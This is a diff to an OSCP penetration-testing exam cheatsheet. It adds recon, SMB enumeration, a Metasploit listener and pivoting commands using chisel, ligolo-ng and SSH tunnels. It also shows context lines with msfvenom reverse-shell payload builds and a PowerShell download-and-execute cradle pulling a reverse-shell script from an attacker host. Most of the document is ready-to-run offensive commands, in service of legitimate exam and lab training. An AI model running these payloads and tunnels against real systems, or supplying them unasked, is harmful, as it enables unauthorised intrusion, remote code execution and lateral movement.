@@ -1,6 +1,7 @@
 # OSCP Command Cheatsheet (Modernized 2026)
 
-> Prefer **NetExec (`nxc`)** over CrackMapExec. Replace `LHOST` / `TARGET` / `DC` as needed.
+> Prefer **NetExec (`nxc`)** over CrackMapExec. Replace `LHOST` / `TARGET` / `DC` as needed.  
+> BoK map: [required-knowledge-2026.md](../00-exam/required-knowledge-2026.md) · Index: [README.md](README.md)
 
 ## Online references
 
@@ -15,7 +16,7 @@
 - https://github.com/0xsyr0/OSCP (community mega-sheet — use as reference, not a dump)
 - https://github.com/OlivierLaflamme/Cheatsheet-God (topic sheets — OSCP-relevant only)
 
-Also: [transfer-and-shells.md](transfer-and-shells.md) · [../03-initial-access/web-attacks.md](../03-initial-access/web-attacks.md)
+Also: [transfer-and-shells.md](transfer-and-shells.md) · [ad-quick.md](ad-quick.md) · [privesc-quick.md](privesc-quick.md) · [../03-initial-access/web-attacks.md](../03-initial-access/web-attacks.md)
 
 ---
 
@@ -25,7 +26,30 @@ Also: [transfer-and-shells.md](transfer-and-shells.md) · [../03-initial-access/
 nmap -Pn -T4 --top-ports 1000 -oA scans/quick TARGET
 nmap --open -Pn -p- -sV -sC -T4 -oA scans/full TARGET
 nmap -p- -v -A -T4 -oA scans/aggressive TARGET
+# Through SOCKS pivot: use -sT, not SYN
+proxychains -q nmap -Pn -sT -p 445,3389,5985,80,443 INTERNAL
 sudo autorecon TARGET --dirbuster.wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+### Web enum (quick)
+
+```bash
+feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak -o scans/ferox_TARGET.txt
+ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,403
+ffuf -u http://TARGET -H 'Host: FUZZ.TARGET' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200
+whatweb -a 3 http://TARGET
+nikto -h http://TARGET   # allowed example; still read output, do not spray-and-pray
+```
+
+### SMB / service enum
+
+```bash
+nxc smb TARGET
+nxc smb TARGET -u '' -p '' --shares
+nxc smb TARGET -u USER -p PASS --shares --users --groups
+smbclient -N -L //TARGET
+smbclient //TARGET/SHARE -U 'USER%PASS'
+enum4linux-ng -A TARGET
 ```
 
 ---
@@ -74,7 +98,9 @@ IEX (New-Object Net.WebClient).DownloadString('http://LHOST/Invoke-PowerShellTcp
 
 ---
 
-## msfvenom
+## msfvenom + Metasploit exam habit
+
+**Exam policy (confirm guide):** `msfvenom` and `multi/handler` are fine broadly. Auxiliary / Exploit / Post modules and **Meterpreter** may only target **one** chosen host (locked on first use). Prefer **manual** shells; never multi-host pivot via MSF.
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443  EXITFUNC=thread -f exe -o shell_443.exe
@@ -86,6 +112,11 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f msi  -o revers
 msfvenom -p linux/x64/shell_reverse_tcp   LHOST=tun0 LPORT=443 -f elf  -o shell.elf
 msfvenom -p php/reverse_php LHOST=tun0 LPORT=443 -f raw -o shell.php
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=443 -f war -o shell.war
+```
+
+```bash
+# multi/handler (manual shell preferred over Meterpreter for multi-host work)
+msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST tun0; set LPORT 443; run'
 ```
 
 ---
@@ -128,12 +159,34 @@ New-PSDrive -Name share -PSProvider FileSystem -Credential $cred -Root \\LHOST\s
 
 ## Pivoting
 
+Full playbook: [../06-pivoting/tunneling.md](../06-pivoting/tunneling.md)
+
 ```bash
-# Chisel
+# Chisel SOCKS
 ./chisel server -p 8001 --reverse
-# victim:
-./chisel client LHOST:8001 R:1080:socks
+# victim: ./chisel client LHOST:8001 R:1080:socks
+# /etc/proxychains4.conf → socks5 127.0.0.1 1080
+proxychains -q nmap -Pn -sT -p 445,3389,5985 172.16.x.x
 proxychains -q nxc smb 172.16.x.0/24 -u user -p pass
+```
+
+```bash
+# ligolo-ng TUN (often preferred — tools without proxychains)
+sudo ip tuntap add user $USER mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+# victim: ./agent -connect LHOST:11601 -ignore-cert
+# ligolo console: session → start
+sudo ip route add 172.16.x.0/24 dev ligolo
+nmap -Pn -sV -p 445,3389,5985 172.16.x.x
+```
+
+```bash
+# SSH pivots (Linux foothold)
+ssh -D 1080 user@PIVOT                              # dynamic SOCKS
+ssh -L 8443:INTERNAL:443 user@PIVOT                 # local forward
+ssh -R 443:127.0.0.1:443 user@PIVOT                 # remote: internal → Kali listener
+ssh -L 5985:INTERNAL:5985 user@PIVOT                # then evil-winrm -i 127.0.0.1
 ```
 
 ---
